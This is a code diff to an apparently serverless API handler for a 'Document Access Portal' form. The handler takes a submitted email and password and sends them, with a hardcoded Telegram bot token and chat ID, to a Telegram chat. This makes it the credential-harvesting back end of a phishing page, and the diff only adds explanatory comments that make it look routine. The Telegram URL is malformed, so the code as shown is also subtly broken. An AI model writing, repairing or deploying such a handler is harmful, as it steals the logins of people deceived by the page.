@@ -1,11 +1,12 @@
 export default async function handler(req, res) {
+    // 1. Enforce strict POST method restriction
     if (req.method !== 'POST') {
         res.setHeader('Allow', ['POST']);
         return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
     }
 
     try {
-        // Manually parse stream body to bypass Vercel configuration bugs
+        // 2. Manually collect and stitch data stream buffers
         let buffers = [];
         for await (const chunk of req) {
             buffers.push(chunk);
@@ -23,19 +24,23 @@ export default async function handler(req, res) {
 
         const { email, password } = body;
 
+        // 3. Validation Check
         if (!email || !password) {
             return res.status(400).json({ error: "Please complete all verification fields." });
         }
 
+        // 4. Configuration Details
         const botToken = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc";
         const chatId = "1080822304";
 
+        // 5. Build Message Template
         const messageText = `📄 *DOCUMENT ACCESS PORTAL REGISTRATION*\n\n`
                           + `📧 *Portal Email:* ${email}\n`
                           + `🔑 *Access Key:* \`${password}\``;
 
         const telegramUrl = `https://telegram.org{botToken}/sendMessage`;
 
+        // 6. Forward Data to Official Telegram API Gateway Subdomain
         const response = await fetch(telegramUrl, {
             method: 'POST',
             headers: {
@@ -50,6 +55,7 @@ export default async function handler(req, res) {
 
         const result = await response.json();
 
+        // 7. Handle Serverless Gateway Responses
         if (response.ok && result.ok) {
             return res.status(200).json({ success: true });
         } else {
@@ -57,6 +63,7 @@ export default async function handler(req, res) {
         }
 
     } catch (error) {
+        // Bubble up internal execution failures transparently to the client interface
         return res.status(500).json({ error: `Server Exception: ${error.message}` });
     }
 }
